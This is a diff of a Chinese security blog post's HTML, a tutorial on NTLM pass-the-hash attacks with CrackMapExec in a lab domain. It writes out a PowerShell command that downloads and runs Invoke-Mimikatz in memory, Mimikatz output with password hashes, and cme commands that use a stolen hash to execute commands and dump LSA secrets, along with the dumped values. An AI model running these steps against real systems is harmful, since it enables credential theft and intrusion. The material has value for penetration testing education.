@@ -1,92 +1,128 @@
-<!doctype html><html><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><title>使用CrackMapExec 进行 NTLM Hash传递攻击 - 倾旋的博客</title><meta name=viewport content="width=device-width,initial-scale=1"><link rel=stylesheet type=text/css media=screen href=https://payloads.online/css/normalize.css><link rel=stylesheet type=text/css media=screen href=https://payloads.online/css/main.css><link rel=stylesheet type=text/css media=screen href=https://payloads.online/css/extra.css><link id=dark-scheme rel=stylesheet type=text/css href=https://payloads.online/css/dark.css><script src=https://payloads.online/js/feather.min.js></script><script src=https://payloads.online/js/main.js></script><link rel=stylesheet href="https://fonts.googleapis.com/css2?family=IBM+Plex+Sans:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500&family=Inter:wght@400;500;600;700&display=swap"><link rel=stylesheet href=/css/fontawesome.css></head><body><div class="container wrapper"><div class=header><div class=avatar><a href=https://payloads.online/><img src=/avatar.jpeg alt=倾旋的博客></a></div><h1 class=site-title><a href=https://payloads.online/>倾旋的博客</a></h1><div class=site-description><p>现阶段在进行有效性验证/攻击模拟相关的安全研究工作，我的博客会记录一些我的学习过程和部分安全技术研究成果。</p><nav class="nav social"><ul class=flat><li><a href=https://github.com/rvn0xsy/ title=Github><i data-feather=github></i></a></li><li><a href=/index.xml title=RSS><i data-feather=rss></i></a></li><li><a href=/ title=Wechat><i data-feather=message-circle></i></a></li><span class=scheme-toggle><a href=# id=scheme-toggle></a></ul></nav></div><nav class=nav><ul class=flat><li><a href=/>首页</a></li><li><a href=/posts/>文章列表</a></li><li><a href=/tags>标签</a></li><li><a href=/projects>开源项目</a></li><li><a href=/about>关于我</a></li><li><a href=/links/>友情链接</a></li><li><a href=/message>留言</a></li><li><a href=/sponsor>赞助</a></li></ul></nav></div><div class=post><div class=post-header><div class=meta><div class=date><span class=day>27</span>
-<span class=rest>Mar 2018</span></div></div><div class=matter><h1 class=title>使用CrackMapExec 进行 NTLM Hash传递攻击</h1></div></div><h2 id=0x01-前言>0x01 前言</h2><p>早期<code>SMB</code>协议在网络上传输明文口令。后来出现 <code>LAN Manager Challenge/Response </code>验证机制，简称<code>LM</code>，它是如此简单以至很容易就被破解。微软提出了WindowsNT挑战/响应验证机制，称之为NTLM。</p><p>从<code>Win2000</code>开始默认协议为<code>Kerboros</code>，下列情况会调用<code>NTLM</code>：</p><ul><li>遗留客户端或服务器需要登录到网络或本地时。</li><li>UNIX客户端需要与NT服务器通话时。</li><li>有正在使用验证<code>NTLM</code>的服务器信息块<code>（SMB）</code>后台程序的UNIX客户端时。</li><li>也即认证方或被认证方有仅支持NTLM情况时。</li></ul><p>它以<code>挑战/响应（Challenge/Response）</code>顺序为基础。</p><ul><li>1.客户端发送用户名和域名到服务器。</li><li>2.服务器转发到域控制器DC。</li><li>3.<code>DC</code>用客户端密码随机产生一个<code>8字节</code>得挑战<code>（Challenge）</code>，发送给服务器。</li><li>4.服务器将挑战转发给客户端。</li><li>5.客户端用密码经过<code>hash</code>及<code>DES</code>加密算法等操作得到一个加密结果响应<code>（Response）</code>发送给服务器。</li><li>6.服务器将响应转发给<code>DC</code>。</li><li>7.<code>DC</code>做同样操作验证客户端响应。</li><li>8.验证结束，返回结果通知服务器。</li></ul><h2 id=0x02-ntlm对渗透的作用>0x02 NTLM对渗透的作用</h2><p>NTLM就好像是一个令牌，有了这个令牌就相当于获取了这个令牌所属者的权限。</p><p>最大的特点就是我们可以使用<code>SMB</code>执行<code>Command</code>。</p><h2 id=0x03-crackmapexec-介绍>0x03 CrackMapExec 介绍</h2><p>CrackMapExec提供了域环境（活动目录）渗透测试中一站式便携工具，它具有列举登录用户、通过SMB(Server Message Block)网络文件共享协议爬虫列出SMB分享列表，执行类似于Psexec的攻击、使用powerShell脚本执行自动式Mimikatz/Shellcode/DLL注入到内存中，dump NTDS.dit密码。</p><p>WiKi:https://github.com/byt3bl33d3r/CrackMapExec/wiki</p><h2 id=0x03-安装crackmapexec>0x03 安装CrackMapExec</h2><h3 id=kali-linux>Kali Linux</h3><p><code>apt-get install crackmapexec</code></p><h3 id=debianubuntu>Debian/Ubuntu</h3><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">2
-</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>apt-get install -y libssl-dev libffi-dev python-dev build-essential
-</span></span><span style=display:flex><span>pip install crackmapexec
-</span></span></code></pre></td></tr></table></div></div><h2 id=0x04-传递ntlm-hash执行命令>0x04 传递NTLM Hash执行命令</h2><h3 id=使用mimikatz获取ntlm-hash>使用<code>Mimikatz</code>获取<code>NTLM Hash</code></h3><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">2
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">3
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">4
-</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-gdscript3 data-lang=gdscript3><span style=display:flex><span>
-</span></span><span style=display:flex><span>PS C:\Users\administrator\Documents<span style=color:#f92672>&gt;</span>IEX(New<span style=color:#f92672>-</span><span style=color:#a6e22e>Object</span> Net<span style=color:#f92672>.</span>WebClient)<span style=color:#f92672>.</span>DownloadString(<span style=color:#e6db74>&#39;https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1&#39;</span>)
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>PS C:\Users\administrator\Documents<span style=color:#f92672>&gt;</span>Invoke<span style=color:#f92672>-</span>Mimikatz
-</span></span></code></pre></td></tr></table></div></div><p>获取NTLM Hash</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">12
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">13
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">14
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">15
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">16
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">17
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">18
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">19
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">20
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">21
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">22
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">23
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">24
-</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>****
-</span></span><span style=display:flex><span>        msv :
-</span></span><span style=display:flex><span>         [00000003] Primary
-</span></span><span style=display:flex><span>         * Username : Administrator
-</span></span><span style=display:flex><span>         * Domain   : PAYLOADS
-</span></span><span style=display:flex><span>         * LM       : 5609e3f4c7c56d5fa86fb73c70515bd7
-</span></span><span style=display:flex><span>         * NTLM     : dab7de8feeb5ecac65faf9fdc6cac3a9
-</span></span><span style=display:flex><span>         * SHA1     : 67302089bba4993f2f845e5992db0a21e64679fa
-</span></span><span style=display:flex><span>        tspkg :
-</span></span><span style=display:flex><span>         * Username : Administrator
-</span></span><span style=display:flex><span>         * Domain   : PAYLOADS
-</span></span><span style=display:flex><span>         * Password : ****
-</span></span><span style=display:flex><span>        wdigest :
-</span></span><span style=display:flex><span>         * Username : Administrator
-</span></span><span style=display:flex><span>         * Domain   : PAYLOADS
-</span></span><span style=display:flex><span>         * Password : ****
-</span></span><span style=display:flex><span>        kerberos :
-</span></span><span style=display:flex><span>         * Username : Administrator
-</span></span><span style=display:flex><span>         * Domain   : PAYLOADS.ONLINE
-</span></span><span style=display:flex><span>         * Password : ****
-</span></span><span style=display:flex><span>        ssp :
-</span></span><span style=display:flex><span>        credman :
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>****
-</span></span></code></pre></td></tr></table></div></div><h3 id=使用crackmapexec执行命令>使用<code>CrackMapExec</code>执行命令</h3><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">2
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">3
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">4
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">5
-</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-gdscript3 data-lang=gdscript3><span style=display:flex><span>root<span style=color:#960050;background-color:#1e0010>@</span>kali:<span style=color:#f92672>~/</span>cache<span style=color:#75715e># cme smb 192.168.3.5 -u administrator -H dab7de8feeb5ecac65faf9fdc6cac3a9 -x whoami</span>
-</span></span><span style=display:flex><span>SMB         <span style=color:#ae81ff>192.168</span><span style=color:#f92672>.</span><span style=color:#ae81ff>3.5</span>     <span style=color:#ae81ff>445</span>    LIYINGZHEA30B    [<span style=color:#f92672>*</span>] Windows <span style=color:#ae81ff>7</span> Ultimate <span style=color:#ae81ff>7601</span> Service Pack <span style=color:#ae81ff>1</span> x64 (name:LIYINGZHEA30B) (domain:PAYLOADS) (signing:False) (SMBv1:True)
-</span></span><span style=display:flex><span>SMB         <span style=color:#ae81ff>192.168</span><span style=color:#f92672>.</span><span style=color:#ae81ff>3.5</span>     <span style=color:#ae81ff>445</span>    LIYINGZHEA30B    [<span style=color:#f92672>+</span>] PAYLOADS\administrator dab7de8feeb5ecac65faf9fdc6cac3a9 (Pwn3d<span style=color:#f92672>!</span>)
-</span></span><span style=display:flex><span>SMB         <span style=color:#ae81ff>192.168</span><span style=color:#f92672>.</span><span style=color:#ae81ff>3.5</span>     <span style=color:#ae81ff>445</span>    LIYINGZHEA30B    [<span style=color:#f92672>+</span>] Executed command 
-</span></span><span style=display:flex><span>SMB         <span style=color:#ae81ff>192.168</span><span style=color:#f92672>.</span><span style=color:#ae81ff>3.5</span>     <span style=color:#ae81ff>445</span>    LIYINGZHEA30B    payloads\administrator
-</span></span></code></pre></td></tr></table></div></div><h3 id=使用crackmapexec获取本地密码local-security-authoritylsa>使用<code>CrackMapExec</code>获取本地密码(Local Security Authority)LSA</h3><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10
-</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>root@kali:~/cache# cme smb 192.168.3.5 -u administrator -H dab7de8feeb5ecac65faf9fdc6cac3a9 --lsa
-</span></span><span style=display:flex><span>SMB         192.168.3.5     445    LIYINGZHEA30B    [*] Windows 7 Ultimate 7601 Service Pack 1 x64 (name:LIYINGZHEA30B) (domain:PAYLOADS) (signing:False) (SMBv1:True)
-</span></span><span style=display:flex><span>SMB         192.168.3.5     445    LIYINGZHEA30B    [+] PAYLOADS\administrator dab7de8feeb5ecac65faf9fdc6cac3a9 (Pwn3d!)
-</span></span><span style=display:flex><span>SMB         192.168.3.5     445    LIYINGZHEA30B    [+] Dumping LSA secrets
-</span></span><span style=display:flex><span>SMB         192.168.3.5     445    LIYINGZHEA30B    WinHack:d3a4b1078aba22996575dd38056e3c99:PAYLOADS.ONLINE:PAYLOADS:::
-</span></span><span style=display:flex><span>SMB         192.168.3.5     445    LIYINGZHEA30B    Administrator:ff007a95ee46c0240e7f0c4b9b0c890a:PAYLOADS.ONLINE:PAYLOADS:::
-</span></span><span style=display:flex><span>SMB         192.168.3.5     445    LIYINGZHEA30B    PAYLOADS\LIYINGZHEA30B$:aad3b435b51404eeaad3b435b51404ee:eda8896ce9133d0bcaf0b6ece9cb0d45:::
-</span></span><span style=display:flex><span>SMB         192.168.3.5     445    LIYINGZHEA30B    DPAPI_SYSTEM:01000000faf06c0f43acbed98d62bd9829d053acb06a00f159e3419d193ff5be56c028fe8d7f0053161d9331
-</span></span><span style=display:flex><span>SMB         192.168.3.5     445    LIYINGZHEA30B    NL$KM:ac8c8a7ce1dd903d74a231a44fcf5df82db711df62e495da9b5f10c3a52dd618a8abce6975c69fea6a9ed69ff6511c62f9a750b5d696a69c3221dc0f1f849f3d
-</span></span><span style=display:flex><span>SMB         192.168.3.5     445    LIYINGZHEA30B    [+] Dumped 5 LSA secrets to /root/.cme/logs/LIYINGZHEA30B_192.168.3.5_2018-03-27_155122.lsa and /root/.cme/logs/LIYINGZHEA30B_192.168.3.5_2018-03-27_155122.cached
-</span></span></code></pre></td></tr></table></div></div><h3 id=more->More &mldr;</h3><p>后续再加</p><hr class=footer-separator><div class=tags></div><div class=back><a href=https://payloads.online/><span aria-hidden=true>← Back</span></a></div><div class=back></div></div><div class=post><script src=https://giscus.app/client.js data-repo=Rvn0xsy/rvn0xsy.github.io data-repo-id="MDEwOlJlcG9zaXRvcnk0MDEyMzI3MTY=" data-category=General data-category-id=DIC_kwDOF-pTTM4CRDk_ data-mapping=title data-strict=0 data-reactions-enabled=1 data-emit-metadata=0 data-input-position=bottom data-theme=light_protanopia data-lang=zh-CN data-loading=lazy crossorigin=anonymous async></script></div></div><div class="footer wrapper"><nav class=nav><div>2024 倾旋 All rights reserved</div></nav></div><script>feather.replace()</script></body></html>
+<!doctype html><html class="not-ready lg:text-base" style=--bg:#faf8f1 lang=zh-cn dir=ltr><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><title>使用CrackMapExec 进行 NTLM Hash传递攻击 - 倾旋的博客</title><meta name=theme-color><meta name=description content="0x01 前言
+早期SMB协议在网络上传输明文口令。后来出现 LAN Manager Challenge/Response 验证机制，简称LM，它是如此简单以至很容易就被破解。微软提出了WindowsNT挑战/响应验证机制，称之为NTLM。
+从Win2000开始默认协议为Kerboros，下列情况会调用NTLM：
+
+遗留客户端或服务器需要登录到网络或本地时。
+UNIX客户端需要与NT服务器通话时。
+有正在使用验证NTLM的服务器信息块（SMB）后台程序的UNIX客户端时。
+也即认证方或被认证方有仅支持NTLM情况时。
+
+它以挑战/响应（Challenge/Response）顺序为基础。
+
+1.客户端发送用户名和域名到服务器。
+2.服务器转发到域控制器DC。
+3.DC用客户端密码随机产生一个8字节得挑战（Challenge），发送给服务器。
+4.服务器将挑战转发给客户端。
+5.客户端用密码经过hash及DES加密算法等操作得到一个加密结果响应（Response）发送给服务器。
+6.服务器将响应转发给DC。
+7.DC做同样操作验证客户端响应。
+8.验证结束，返回结果通知服务器。
+
+0x02 NTLM对渗透的作用
+NTLM就好像是一个令牌，有了这个令牌就相当于获取了这个令牌所属者的权限。
+最大的特点就是我们可以使用SMB执行Command。
+0x03 CrackMapExec 介绍
+CrackMapExec提供了域环境（活动目录）渗透测试中一站式便携工具，它具有列举登录用户、通过SMB(Server Message Block)网络文件共享协议爬虫列出SMB分享列表，执行类似于Psexec的攻击、使用powerShell脚本执行自动式Mimikatz/Shellcode/DLL注入到内存中，dump NTDS.dit密码。
+WiKi:https://github.com/byt3bl33d3r/CrackMapExec/wiki
+0x03 安装CrackMapExec
+Kali Linux
+apt-get install crackmapexec
+Debian/Ubuntu
+apt-get install -y libssl-dev libffi-dev python-dev build-essential
+pip install crackmapexec
+0x04 传递NTLM Hash执行命令
+使用Mimikatz获取NTLM Hash
+
+PS C:\Users\administrator\Documents>IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1')
+
+PS C:\Users\administrator\Documents>Invoke-Mimikatz
+获取NTLM Hash
+****
+        msv :
+         [00000003] Primary
+         * Username : Administrator
+         * Domain   : PAYLOADS
+         * LM       : 5609e3f4c7c56d5fa86fb73c70515bd7
+         * NTLM     : dab7de8feeb5ecac65faf9fdc6cac3a9
+         * SHA1     : 67302089bba4993f2f845e5992db0a21e64679fa
+        tspkg :
+         * Username : Administrator
+         * Domain   : PAYLOADS
+         * Password : ****
+        wdigest :
+         * Username : Administrator
+         * Domain   : PAYLOADS
+         * Password : ****
+        kerberos :
+         * Username : Administrator
+         * Domain   : PAYLOADS.ONLINE
+         * Password : ****
+        ssp :
+        credman :
+
+****
+使用CrackMapExec执行命令
+root@kali:~/cache# cme smb 192.168.3.5 -u administrator -H dab7de8feeb5ecac65faf9fdc6cac3a9 -x whoami
+SMB         192.168.3.5     445    LIYINGZHEA30B    [*] Windows 7 Ultimate 7601 Service Pack 1 x64 (name:LIYINGZHEA30B) (domain:PAYLOADS) (signing:False) (SMBv1:True)
+SMB         192.168.3.5     445    LIYINGZHEA30B    [+] PAYLOADS\administrator dab7de8feeb5ecac65faf9fdc6cac3a9 (Pwn3d!)
+SMB         192.168.3.5     445    LIYINGZHEA30B    [+] Executed command 
+SMB         192.168.3.5     445    LIYINGZHEA30B    payloads\administrator
+使用CrackMapExec获取本地密码(Local Security Authority)LSA
+root@kali:~/cache# cme smb 192.168.3.5 -u administrator -H dab7de8feeb5ecac65faf9fdc6cac3a9 --lsa
+SMB         192.168.3.5     445    LIYINGZHEA30B    [*] Windows 7 Ultimate 7601 Service Pack 1 x64 (name:LIYINGZHEA30B) (domain:PAYLOADS) (signing:False) (SMBv1:True)
+SMB         192.168.3.5     445    LIYINGZHEA30B    [+] PAYLOADS\administrator dab7de8feeb5ecac65faf9fdc6cac3a9 (Pwn3d!)
+SMB         192.168.3.5     445    LIYINGZHEA30B    [+] Dumping LSA secrets
+SMB         192.168.3.5     445    LIYINGZHEA30B    WinHack:d3a4b1078aba22996575dd38056e3c99:PAYLOADS.ONLINE:PAYLOADS:::
+SMB         192.168.3.5     445    LIYINGZHEA30B    Administrator:ff007a95ee46c0240e7f0c4b9b0c890a:PAYLOADS.ONLINE:PAYLOADS:::
+SMB         192.168.3.5     445    LIYINGZHEA30B    PAYLOADS\LIYINGZHEA30B$:aad3b435b51404eeaad3b435b51404ee:eda8896ce9133d0bcaf0b6ece9cb0d45:::
+SMB         192.168.3.5     445    LIYINGZHEA30B    DPAPI_SYSTEM:01000000faf06c0f43acbed98d62bd9829d053acb06a00f159e3419d193ff5be56c028fe8d7f0053161d9331
+SMB         192.168.3.5     445    LIYINGZHEA30B    NL$KM:ac8c8a7ce1dd903d74a231a44fcf5df82db711df62e495da9b5f10c3a52dd618a8abce6975c69fea6a9ed69ff6511c62f9a750b5d696a69c3221dc0f1f849f3d
+SMB         192.168.3.5     445    LIYINGZHEA30B    [+] Dumped 5 LSA secrets to /root/.cme/logs/LIYINGZHEA30B_192.168.3.5_2018-03-27_155122.lsa and /root/.cme/logs/LIYINGZHEA30B_192.168.3.5_2018-03-27_155122.cached
+More &mldr;
+后续再加"><meta name=author content="倾旋的博客"><link rel="preload stylesheet" as=style href=https://payloads.online/main.min.css><link rel=preload as=image href=https://payloads.online/theme.png><link rel=preload as=image href=/avatar.jpeg><script defer src=https://payloads.online/highlight.min.js onload=hljs.initHighlightingOnLoad()></script><link rel=icon href=https://payloads.online/favicon.ico><link rel=apple-touch-icon href=https://payloads.online/apple-touch-icon.png><meta name=generator content="Hugo 0.148.2"><meta itemprop=name content="使用CrackMapExec 进行 NTLM Hash传递攻击"><meta itemprop=description content="本文介绍一个工具 - CrackMapExec 进行 NTLM Hash传递攻击"><meta itemprop=datePublished content="2018-03-27T00:00:00+00:00"><meta itemprop=dateModified content="2018-03-27T00:00:00+00:00"><meta itemprop=wordCount content="269"><meta itemprop=keywords content="内网渗透"><meta property="og:url" content="https://payloads.online/archivers/2018-03-27/1/"><meta property="og:site_name" content="倾旋的博客"><meta property="og:title" content="使用CrackMapExec 进行 NTLM Hash传递攻击"><meta property="og:description" content="本文介绍一个工具 - CrackMapExec 进行 NTLM Hash传递攻击"><meta property="og:locale" content="zh_cn"><meta property="og:type" content="article"><meta property="article:section" content="posts"><meta property="article:published_time" content="2018-03-27T00:00:00+00:00"><meta property="article:modified_time" content="2018-03-27T00:00:00+00:00"><meta name=twitter:card content="summary"><meta name=twitter:title content="使用CrackMapExec 进行 NTLM Hash传递攻击"><meta name=twitter:description content="本文介绍一个工具 - CrackMapExec 进行 NTLM Hash传递攻击"><link rel=canonical href=https://payloads.online/archivers/2018-03-27/1/></head><body class="bg-(--bg) text-black antialiased duration-200 ease-out [-webkit-tap-highlight-color:transparent] dark:text-white"><header class="mx-auto flex h-[4.5rem] max-w-(--w) px-8 whitespace-nowrap lg:justify-center"><div class="relative z-50 flex items-center ltr:mr-auto rtl:ml-auto"><a class="-translate-y-[1px] text-2xl font-medium" href=https://payloads.online/>倾旋的博客</a><div class="btn-dark text-[0px] ltr:ml-4 rtl:mr-4 h-6 w-6 shrink-0 cursor-pointer [background:url(./theme.png)_left_center/_auto_theme('spacing.6')_no-repeat] [transition:_background-position_0.4s_steps(5)] dark:[background-position:right]" role=button aria-label=Dark></div></div><div class="btn-menu relative z-50 flex h-[4.5rem] w-[5rem] shrink-0 cursor-pointer flex-col items-center justify-center gap-2.5 lg:hidden ltr:-mr-8 rtl:-ml-8" role=button aria-label=Menu></div><script>const htmlClass=document.documentElement.classList;setTimeout(()=>{htmlClass.remove("not-ready")},10);const btnMenu=document.querySelector(".btn-menu");btnMenu.addEventListener("click",()=>{htmlClass.toggle("open")});const metaTheme=document.querySelector('meta[name="theme-color"]'),lightBg="#faf8f1".replace(/"/g,""),setDark=e=>{metaTheme.setAttribute("content",e?"#000":lightBg),htmlClass[e?"add":"remove"]("dark"),localStorage.setItem("dark",e)},darkScheme=window.matchMedia("(prefers-color-scheme: dark)");if(htmlClass.contains("dark"))setDark(!0);else{const e=localStorage.getItem("dark");setDark(e?e==="true":darkScheme.matches)}darkScheme.addEventListener("change",e=>{setDark(e.matches)});const btnDark=document.querySelector(".btn-dark");btnDark.addEventListener("click",()=>{setDark(localStorage.getItem("dark")!=="true")})</script><div class="nav-wrapper fixed inset-x-0 top-full z-40 flex h-full flex-col justify-center bg-(--bg) pb-16 duration-200 select-none lg:static lg:h-auto lg:flex-row lg:bg-transparent! lg:pb-0 lg:transition-none"><nav class="lg:ml-12 lg:flex lg:flex-row lg:items-center lg:space-x-10 rtl:space-x-reverse"><a class="block text-center text-xl leading-[5rem] lg:text-base lg:font-normal" href=/>首页</a><a class="block text-center text-xl leading-[5rem] lg:text-base lg:font-normal" href=/posts/>文章列表</a><a class="block text-center text-xl leading-[5rem] lg:text-base lg:font-normal" href=/tags>标签</a><a class="block text-center text-xl leading-[5rem] lg:text-base lg:font-normal" href=/projects>开源项目</a><a class="block text-center text-xl leading-[5rem] lg:text-base lg:font-normal" href=/about>关于我</a><a class="block text-center text-xl leading-[5rem] lg:text-base lg:font-normal" href=/links/>友情链接</a><a class="block text-center text-xl leading-[5rem] lg:text-base lg:font-normal" href=/message>留言</a><a class="block text-center text-xl leading-[5rem] lg:text-base lg:font-normal" href=/sponsor>赞助</a></nav></div></header><main class="prose prose-neutral dark:prose-invert relative mx-auto min-h-[calc(100vh-9rem)] max-w-(--w) px-8 pt-14 pb-16"><article><header class=mb-14><h1 class="my-0! pb-2.5">使用CrackMapExec 进行 NTLM Hash传递攻击</h1><div class="text-xs antialiased opacity-60"><time>Mar 27, 2018</time><span class=mx-1>&#183;</span>
